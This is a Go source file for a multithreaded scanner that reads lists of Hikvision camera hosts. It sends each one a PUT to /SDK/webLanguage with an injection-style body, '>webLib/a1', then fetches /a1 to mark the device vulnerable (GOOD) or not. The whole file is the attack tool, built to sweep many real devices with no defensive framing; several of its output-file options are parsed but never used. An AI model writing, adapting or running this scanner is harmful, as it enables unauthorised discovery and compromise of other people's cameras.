package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

type ECannotReadInFile struct {
	error
}

func NewECannotReadInFile(s string) error {
	return &ECannotReadInFile{errors.New(s)}
}

type EInFileRequired struct {
	error
}

func NewEInFileRequired(s string) error {
	return &EInFileRequired{errors.New(s)}
}

type EMaxTriesMustBeBetterThanZero struct {
	error
}

func NewEMaxTriesMustBeBetterThanZero(s string) error {
	return &EMaxTriesMustBeBetterThanZero{errors.New(s)}
}

type EThreadsMustBeBetterThanZero struct {
	error
}

func NewEThreadsMustBeBetterThanZero(s string) error {
	return &EThreadsMustBeBetterThanZero{errors.New(s)}
}

type ProgramArgs struct {
	infile      *string
	goodfile    *string
	badfile     *string
	errfile     *string
	unknownfile *string
	timeout     *int
	delay       *int
	maxTries    *int
	threads     *int
}

type HttpResponse struct {
	code int
	text string
}

type ColorPrint struct {
	info *color.Color
	warn *color.Color
	err  *color.Color
	ok   *color.Color
	good *color.Color
	bad  *color.Color
}

type Target struct {
	host     string
	port     int
	proto    string // http or https
	timeout  int    // request timeout
	delay    int    // delay before send second request
	try      int    // current try
	maxTries int    // max tries
}

func (target Target) send(url string, request_data interface{}) (HttpResponse, error) {
	time.Sleep(time.Duration(target.delay) * time.Millisecond)
	method := http.MethodPut
	data := ""
	full_url := fmt.Sprintf("%v://%v:%v%v", target.proto, target.host, target.port, url)

	switch v := request_data.(type) {
	case nil:
		data = ""
		method = http.MethodGet
	case []byte:
		data = string(v)
	case string:
		data = v
	}

	req, err := http.NewRequest(method, full_url, strings.NewReader(data))
	if err != nil {
		return HttpResponse{}, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
	req.Header.Set("Accept", "*/*")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,sv;q=0.8")

	client := &http.Client{
		Timeout: time.Duration(target.timeout) * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		if target.proto == "http" && target.try == target.maxTries {
			target.proto = "https"
			target.try = 0
		} else if target.proto == "https" && target.try == target.maxTries {
			return HttpResponse{}, err
		}
		target.try = target.try + 1
		return target.send(url, request_data)
	}

	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		colfmt.err.Println(err)
	}
	resp.Body.Close()
	return HttpResponse{resp.StatusCode, string(bytes)}, nil
}

func (target Target) checkTarget() {
	resp, err := target.send("/SDK/webLanguage", ">webLib/a1")
	if err != nil || resp.code == 404 {
		fmt.Println(colfmt.err.Sprint("*ERR*"), target.host, target.port)
		return
	}

	resp, err = target.send("/a1", nil)
	if err != nil {
		fmt.Println(colfmt.err.Sprint("*ERR"), target.host, target.port)
		return
	}
	if resp.code == 200 {
		fmt.Println(colfmt.good.Sprint("GOOD"), target.host, target.port)
	} else if resp.code == 500 {
		fmt.Println(colfmt.info.Sprint("UNKNOWN"), target.host, target.port)
	} else {
		fmt.Println(colfmt.bad.Sprint("BAD"), target.host, target.port)
	}
}

var colfmt = &ColorPrint{
	info: color.New(color.BgBlack),
	warn: color.New(color.BgYellow),
	err:  color.New(color.BgRed),
	ok:   color.New(color.BgGreen),
	good: color.New(color.BgHiGreen),
	bad:  color.New(color.BgHiRed),
}

func printColoredErr(err error) {
	fmt.Println(colfmt.err.Sprint(fmt.Sprintf("%T:", err)), err)
}

func parseProgramArgs() (ProgramArgs, error) {
	inputFile := flag.String("infile", "", "file with hikvision host:port format (required)")
	goodFile := flag.String("good", "", "save good hosts to file")
	badFile := flag.String("bad", "", "save bad hosts to file")
	errFile := flag.String("err", "", "save error hosts to file")
	unknownFile := flag.String("unknown", "", "save unknown hosts to file")
	timeout := flag.Int("timeout", 5, "request timeout")
	delay := flag.Int("delay", 1000, "delay between requests in ms")
	maxTries := flag.Int("max_tries", 1, "max tries count to make request")
	threads := flag.Int("threads", 1, "threads count to making requests")
	flag.Parse()

	// check program required args
	if *inputFile == "" {
		return ProgramArgs{}, NewEInFileRequired("-infile is required")
	}
	if *maxTries < 1 {
		return ProgramArgs{}, NewEMaxTriesMustBeBetterThanZero("-max_tries must be > 0")
	}
	if *threads < 1 {
		return ProgramArgs{}, NewEThreadsMustBeBetterThanZero("-threads must be > 0")
	}

	return ProgramArgs{inputFile, goodFile, badFile, errFile, unknownFile, timeout, delay, maxTries, threads}, nil
}

func parseTargets(args ProgramArgs) ([]Target, error) {
	// read input file
	inputFileBytes, err := os.ReadFile(*args.infile)
	if err != nil {
		return []Target{}, NewECannotReadInFile(fmt.Sprint("Cannot read infile! error -> ", err))
	}

	lines := strings.Split(string(inputFileBytes), "\n")
	targets := make([]Target, 0, len(lines))
	for _, line := range lines {
		splitedLine := strings.Split(line, ":")

		// if splited line not enough port or host
		if len(splitedLine) < 2 {
			colfmt.warn.Println("Cannot parse line ->", line)
			continue
		}
		host := splitedLine[0]
		port, err := strconv.Atoi(strings.Trim(splitedLine[1], " \t\n"))

		// if port is invalid
		if err != nil {
			colfmt.warn.Println("Cannot parse port to host ->", host)
			continue
		}
		targets = append(targets, Target{host, port, "http", *args.timeout, *args.delay, 1, *args.maxTries})
	}
	return targets, nil
}

func bruteThread(targetChan chan Target, wg *sync.WaitGroup, threadNumber int) {
	colfmt.info.Printf("thread %v started\n", threadNumber)
	for {
		select {
		case target := <-targetChan: // get target from chan
			target.checkTarget()
		case <-time.After(3 * time.Second): // timeout 3 seconds
			wg.Done()
			colfmt.info.Printf("thread %v finished\n", threadNumber)
			return
		}
	}
}

func fillTargetChan(targets *[]Target, targetChan chan Target, wg *sync.WaitGroup) {
	for _, target := range *targets {
		targetChan <- target
	}
	wg.Done()
}

func main() {
	programArgs, err := parseProgramArgs()
	if err != nil {
		printColoredErr(err)
		os.Exit(1)
	}

	fmt.Print("Input file: ", colfmt.ok.Sprint(*programArgs.infile),
		"\nGood file: ", colfmt.ok.Sprint(*programArgs.goodfile),
		"\nBad file: ", colfmt.ok.Sprint(*programArgs.badfile),
		"\nErr file: ", colfmt.ok.Sprint(*programArgs.errfile),
		"\nUnknown file: ", colfmt.ok.Sprint(*programArgs.unknownfile),
		"\nTimeout: ", colfmt.ok.Sprint(*programArgs.timeout, "s"),
		"\nDelay: ", colfmt.ok.Sprint(*programArgs.delay, "ms"),
		"\nMax tries: ", colfmt.ok.Sprint(*programArgs.maxTries),
		"\nThreads: ", colfmt.ok.Sprint(*programArgs.threads), "\n\n",
	)

	// read input file
	targets, err := parseTargets(programArgs)
	if err != nil {
		printColoredErr(err)
		os.Exit(1)
	}

	fmt.Print("\nTargets count: ", colfmt.ok.Sprint(len(targets)), "\n\n")

	wg := sync.WaitGroup{}
	// calculating threads count
	wg.Add(1 + *programArgs.threads)
	targetChan := make(chan Target)

	// add all targets to chan
	go fillTargetChan(&targets, targetChan, &wg)
	// starting threads
	for i := 0; i < *programArgs.threads; i++ {
		go bruteThread(targetChan, &wg, i+1)
	}
	wg.Wait()
}
